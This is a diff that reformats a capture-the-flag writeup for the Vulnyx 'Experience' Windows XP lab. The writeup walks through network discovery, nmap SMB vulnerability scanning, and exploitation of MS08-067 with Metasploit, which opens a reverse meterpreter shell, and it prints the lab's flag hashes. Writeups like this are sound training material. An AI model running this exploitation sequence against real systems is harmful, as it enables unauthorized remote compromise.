@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Experience 
+---
+icon: windows
+---
 
-**Platform:** Vulnyx  
-**Operating System:** Windows  
+# Experience ​​
+
+## 🖥️ Writeup - Experience
+
+**Platform:** Vulnyx\
+**Operating System:** Windows
 
 > **Tags:** `Windows` `Windows XP` `SMB` `NSE Scripts` `MS08-067` `NetAPI` `Metasploit` `Stack Buffer Overflow`
 
-# INSTALLATION
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Experience machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Experience machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Experience, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,19 +38,20 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:53:c4:af      1      60  PCS Systemtechnik GmbH      
  10.0.4.34       08:00:27:79:32:15      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 We identify with high confidence that the victim’s IP is `10.0.4.34`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.34
-``` 
+```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 21:29 CET
 Nmap scan report for 10.0.4.34
@@ -69,6 +78,7 @@ sudo nmap -p445 --script="smb-vuln-*" 10.0.4.34
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 21:29 CET
 Nmap scan report for 10.0.4.34
@@ -117,7 +127,7 @@ The scan reveals that the target is susceptible to `MS08-067`, which is a `RCE` 
 
 We are aware that there is a specific `Metasploit` module to target this vulnerability.
 
-# METASPLOIT
+## METASPLOIT
 
 ```bash
 msfconsole
@@ -133,6 +143,7 @@ msf exploit(windows/smb/ms08_067_netapi) > run
 ```
 
 Info:
+
 ```
 [*] Started reverse TCP handler on 10.0.4.12:4444 
 [*] 10.0.4.34:445 - Automatically detecting the target...
@@ -164,5 +175,3 @@ f9e24c8da0686680decee9e594178a2e
 cmeterpreter > cat root.txt 
 c1d5e7e4efece4a6022c4a4080c8114d
 ```
-
-
